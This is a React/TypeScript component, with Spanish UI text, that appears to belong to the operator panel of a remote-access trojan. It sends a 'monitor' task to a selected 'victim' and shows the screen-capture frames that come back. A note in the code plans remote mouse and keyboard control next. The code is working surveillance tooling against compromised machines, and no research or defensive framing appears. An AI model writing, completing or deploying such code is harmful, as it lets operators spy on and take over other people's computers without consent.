'use client';
import { useEffect } from 'react';
import { Camera, Monitor } from 'lucide-react';
import { useApi, mutate } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import type { Task, Victim } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { dateTime } from '@/lib/format';

type Frame = { ts: number; data: string };

/** Ráfaga de `monitor` sobre el canal actual: sin stream persistente ni WS nuevo. */
export function MonitorPanel({ victim }: { victim: Victim }) {
  const { data, loading, refresh } = useApi<{ items: Task[] }>(`/tasks?victim=${victim.id}&name=monitor&limit=4`, { pollMs: 4_000 });
  const live = useLiveContext();
  const last = live.events[0];

  useEffect(() => {
    if (last?.type === 'task.update') refresh();
  }, [last?.at]); // eslint-disable-line react-hooks/exhaustive-deps

  async function capture() {
    await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'monitor', params: { seconds: 5, fps: 1, quality: 60 }, timeout_sec: 90 });
    refresh();
  }

  const task = (data?.items ?? []).find((item) => item.status === 'done' && item.result);
  const frames = ((task?.result as { frames?: Frame[] } | null)?.frames ?? []).slice(0, 12);
  const running = (data?.items ?? []).find((item) => ['queued', 'running'].includes(item.status));

  return (
    <div>
      <div className="mb-2 flex items-center justify-between gap-2">
        <p className="text-2xs uppercase tracking-wide text-muted">Ráfaga de pantalla</p>
        <div className="flex gap-1">
          {running ? <Badge tone="warn">{running.status}</Badge> : null}
          <Button size="sm" variant="secondary" disabled={!victim.socket || Boolean(running)} onClick={capture}><Monitor className="h-3 w-3" /> 5 s</Button>
        </div>
      </div>
      {loading && frames.length === 0 ? <p className="py-6 text-center text-xs text-muted">Cargando…</p> : null}
      {!loading && frames.length === 0 ? (
        <p className="rounded border border-line px-3 py-6 text-center text-xs text-muted">Sin fotogramas. Lanza una ráfaga de 5 s a 1 FPS; cada frame es JPEG y viaja en el resultado de la tarea.</p>
      ) : (
        <div className="grid grid-cols-2 gap-1.5">
          {frames.map((frame, index) => (
            <figure key={`${frame.ts}-${index}`} className="overflow-hidden rounded border border-line">
              <img src={`data:image/jpeg;base64,${frame.data}`} alt={`fotograma ${index + 1}`} className="w-full object-cover" />
              <figcaption className="px-1 py-0.5 font-mono text-2xs text-muted">{new Date(frame.ts * 1000).toLocaleTimeString('es-ES', { hour12: false })}</figcaption>
            </figure>
          ))}
        </div>
      )}
      {task ? <p className="mt-1 text-2xs text-muted">Última ráfaga {dateTime(task.finishedAt ?? task.createdAt)} · <Camera className="inline h-2.5 w-2.5" /> {frames.length} frames</p> : null}
      <p className="mt-2 text-2xs text-muted/70">El control de ratón/teclado necesita el canal de entrada; queda para la siguiente iteración del módulo.</p>
    </div>
  );
}
